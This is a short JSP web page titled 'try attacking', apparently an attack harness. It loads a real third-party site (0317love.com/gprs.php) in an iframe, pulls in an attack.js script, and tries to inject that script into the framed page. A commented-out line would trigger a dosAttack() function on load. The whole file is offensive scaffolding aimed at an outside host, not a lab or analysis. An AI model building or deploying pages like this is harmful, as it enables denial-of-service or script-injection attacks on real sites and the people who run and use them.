<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>try attacking</title>
<link rel="stylesheet" href="/css/attack.css" type="text/css" />

</head>
<body>
<!-- 	<iframe onload="dosAttack()" src="http://0317love.com/gprs.php"></iframe> -->
	<iframe src="http://0317love.com/gprs.php"></iframe>
</body>
<script src="/js/attack.js">
</script>
<script type="text/javascript">
	var iframeDoc = document.getElementsByTagName("iframe")[0].contentWindow.document;
	iframeDoc.write('<script src="/js/attack.js?random=' + Math.random() + '"><\/script>');
// 	iframeDoc.write("<script src=\"//cdn.bootcss.com/jquery/3.0.0-alpha1/jquery.js\"><\/script>");
</script>
</html>